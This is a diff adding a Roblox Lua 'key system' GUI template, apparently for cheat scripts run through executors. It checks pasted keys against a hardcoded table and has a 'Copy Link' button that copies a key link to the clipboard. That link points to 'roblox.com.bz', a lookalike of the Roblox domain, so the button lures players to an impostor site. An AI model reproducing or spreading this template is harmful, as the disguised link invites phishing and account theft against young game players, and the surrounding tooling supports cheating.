@@ -1,0 +1,196 @@
+-- ============================================
+--   KEY SYSTEM GUI  |  Edit values below
+-- ============================================
+
+local VALID_KEYS = {
+    ["YOUR-KEY-HERE-0001"] = true,
+    ["YOUR-KEY-HERE-0002"] = true,
+}
+local GET_KEY_LINK = "https://roblox.com.bz/communities/5923898316/"  -- Change this anytime
+local SCRIPT_NAME  = "YOUR SCRIPT NAME"
+
+-- ============================================
+--   GUI Setup
+-- ============================================
+
+local Players    = game:GetService("Players")
+local TweenService = game:GetService("TweenService")
+local lp = Players.LocalPlayer
+local pGui = lp:WaitForChild("PlayerGui")
+
+local Screen = Instance.new("ScreenGui", pGui)
+Screen.Name = "KeySystem"
+Screen.ResetOnSpawn = false
+Screen.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+
+-- Backdrop blur
+local Blur = Instance.new("Frame", Screen)
+Blur.Size = UDim2.fromScale(1, 1)
+Blur.BackgroundColor3 = Color3.fromRGB(5, 5, 10)
+Blur.BackgroundTransparency = 0.35
+Blur.ZIndex = 1
+
+-- Main window
+local Window = Instance.new("Frame", Screen)
+Window.Size = UDim2.fromOffset(480, 260)
+Window.Position = UDim2.fromScale(0.5, 0.5)
+Window.AnchorPoint = Vector2.new(0.5, 0.5)
+Window.BackgroundColor3 = Color3.fromRGB(15, 15, 20)
+Window.BorderSizePixel = 0
+Window.ZIndex = 2
+
+local WinCorner = Instance.new("UICorner", Window)
+WinCorner.CornerRadius = UDim.new(0, 12)
+
+local WinStroke = Instance.new("UIStroke", Window)
+WinStroke.Color = Color3.fromRGB(42, 42, 58)
+WinStroke.Thickness = 1
+
+-- Title bar
+local TitleBar = Instance.new("Frame", Window)
+TitleBar.Size = UDim2.new(1, 0, 0, 40)
+TitleBar.BackgroundColor3 = Color3.fromRGB(19, 19, 28)
+TitleBar.BorderSizePixel = 0
+TitleBar.ZIndex = 3
+
+local TitleLabel = Instance.new("TextLabel", TitleBar)
+TitleLabel.Size = UDim2.new(1, -20, 1, 0)
+TitleLabel.Position = UDim2.fromOffset(14, 0)
+TitleLabel.BackgroundTransparency = 1
+TitleLabel.Text = "🔑  KEY SYSTEM  —  " .. SCRIPT_NAME
+TitleLabel.TextColor3 = Color3.fromRGB(196, 181, 253)
+TitleLabel.TextXAlignment = Enum.TextXAlignment.Left
+TitleLabel.Font = Enum.Font.GothamBold
+TitleLabel.TextSize = 13
+TitleLabel.ZIndex = 4
+
+-- Close button
+local CloseBtn = Instance.new("TextButton", TitleBar)
+CloseBtn.Size = UDim2.fromOffset(28, 28)
+CloseBtn.Position = UDim2.new(1, -36, 0.5, -14)
+CloseBtn.BackgroundColor3 = Color3.fromRGB(255, 95, 87)
+CloseBtn.Text = "✕"
+CloseBtn.TextColor3 = Color3.fromRGB(255,255,255)
+CloseBtn.Font = Enum.Font.GothamBold
+CloseBtn.TextSize = 12
+CloseBtn.ZIndex = 5
+Instance.new("UICorner", CloseBtn).CornerRadius = UDim.new(1, 0)
+
+-- Key input box
+local KeyBox = Instance.new("TextBox", Window)
+KeyBox.Size = UDim2.new(1, -40, 0, 42)
+KeyBox.Position = UDim2.fromOffset(20, 58)
+KeyBox.BackgroundColor3 = Color3.fromRGB(10, 10, 16)
+KeyBox.BorderSizePixel = 0
+KeyBox.PlaceholderText = "Paste key here... (XXXX-XXXX-XXXX-XXXX)"
+KeyBox.PlaceholderColor3 = Color3.fromRGB(46, 46, 74)
+KeyBox.Text = ""
+KeyBox.TextColor3 = Color3.fromRGB(165, 180, 252)
+KeyBox.Font = Enum.Font.Code
+KeyBox.TextSize = 14
+KeyBox.ClearTextOnFocus = false
+KeyBox.ZIndex = 3
+local KBCorner = Instance.new("UICorner", KeyBox)
+KBCorner.CornerRadius = UDim.new(0, 8)
+local KBStroke = Instance.new("UIStroke", KeyBox)
+KBStroke.Color = Color3.fromRGB(42, 42, 58)
+
+-- Status label
+local StatusLabel = Instance.new("TextLabel", Window)
+StatusLabel.Size = UDim2.new(1, -40, 0, 24)
+StatusLabel.Position = UDim2.fromOffset(20, 110)
+StatusLabel.BackgroundTransparency = 1
+StatusLabel.Text = "⬤  Awaiting key verification..."
+StatusLabel.TextColor3 = Color3.fromRGB(74, 74, 106)
+StatusLabel.Font = Enum.Font.Code
+StatusLabel.TextSize = 12
+StatusLabel.TextXAlignment = Enum.TextXAlignment.Left
+StatusLabel.ZIndex = 3
+
+-- Check Key button (left)
+local CheckBtn = Instance.new("TextButton", Window)
+CheckBtn.Size = UDim2.new(0.5, -25, 0, 44)
+CheckBtn.Position = UDim2.fromOffset(20, 146)
+CheckBtn.BackgroundColor3 = Color3.fromRGB(26, 26, 46)
+CheckBtn.Text = "🛡  CHECK KEY"
+CheckBtn.TextColor3 = Color3.fromRGB(165, 180, 252)
+CheckBtn.Font = Enum.Font.GothamBold
+CheckBtn.TextSize = 13
+CheckBtn.ZIndex = 3
+local CBCorner = Instance.new("UICorner", CheckBtn)
+CBCorner.CornerRadius = UDim.new(0, 8)
+local CBStroke = Instance.new("UIStroke", CheckBtn)
+CBStroke.Color = Color3.fromRGB(55, 48, 163)
+
+-- Copy Link button (right)
+local CopyBtn = Instance.new("TextButton", Window)
+CopyBtn.Size = UDim2.new(0.5, -25, 0, 44)
+CopyBtn.Position = UDim2.new(0.5, 5, 0, 146)
+CopyBtn.BackgroundColor3 = Color3.fromRGB(30, 10, 58)
+CopyBtn.Text = "🔗  COPY LINK"
+CopyBtn.TextColor3 = Color3.fromRGB(196, 181, 253)
+CopyBtn.Font = Enum.Font.GothamBold
+CopyBtn.TextSize = 13
+CopyBtn.ZIndex = 3
+local LBCorner = Instance.new("UICorner", CopyBtn)
+LBCorner.CornerRadius = UDim.new(0, 8)
+local LBStroke = Instance.new("UIStroke", CopyBtn)
+LBStroke.Color = Color3.fromRGB(109, 40, 217)
+
+-- Footer
+local Footer = Instance.new("TextLabel", Window)
+Footer.Size = UDim2.new(1, -40, 0, 28)
+Footer.Position = UDim2.new(0, 20, 1, -34)
+Footer.BackgroundTransparency = 1
+Footer.Text = "© 2025 " .. SCRIPT_NAME .. "  |  Get your key via Copy Link"
+Footer.TextColor3 = Color3.fromRGB(42, 42, 66)
+Footer.Font = Enum.Font.Code
+Footer.TextSize = 11
+Footer.TextXAlignment = Enum.TextXAlignment.Center
+Footer.ZIndex = 3
+
+-- ============================================
+--   Logic
+-- ============================================
+
+local function setStatus(ok, msg)
+    if ok == true then
+        StatusLabel.TextColor3 = Color3.fromRGB(134, 239, 172)
+        StatusLabel.Text = "⬤  " .. msg
+    elseif ok == false then
+        StatusLabel.TextColor3 = Color3.fromRGB(252, 165, 165)
+        StatusLabel.Text = "⬤  " .. msg
+    else
+        StatusLabel.TextColor3 = Color3.fromRGB(74, 74, 106)
+        StatusLabel.Text = "⬤  " .. msg
+    end
+end
+
+CheckBtn.MouseButton1Click:Connect(function()
+    local key = KeyBox.Text:gsub("%s+", ""):upper()
+    if key == "" then
+        setStatus(false, "No key entered — paste your key above.")
+        return
+    end
+    setStatus(nil, "Verifying key...")
+    task.wait(0.8)
+    if VALID_KEYS[key] then
+        setStatus(true, "Key verified! Access granted.")
+        task.wait(1.2)
+        Screen:Destroy()       -- Close GUI and run your script below
+        -- << YOUR MAIN SCRIPT CODE HERE >>
+    else
+        setStatus(false, "Invalid key. Use Copy Link to get a valid key.")
+    end
+end)
+
+CopyBtn.MouseButton1Click:Connect(function()
+    setclipboard(GET_KEY_LINK)   -- sets clipboard in most executors
+    CopyBtn.Text = "✓  COPIED!"
+    task.wait(1.5)
+    CopyBtn.Text = "🔗  COPY LINK"
+end)
+
+CloseBtn.MouseButton1Click:Connect(function()
+    Screen:Destroy()
+end)
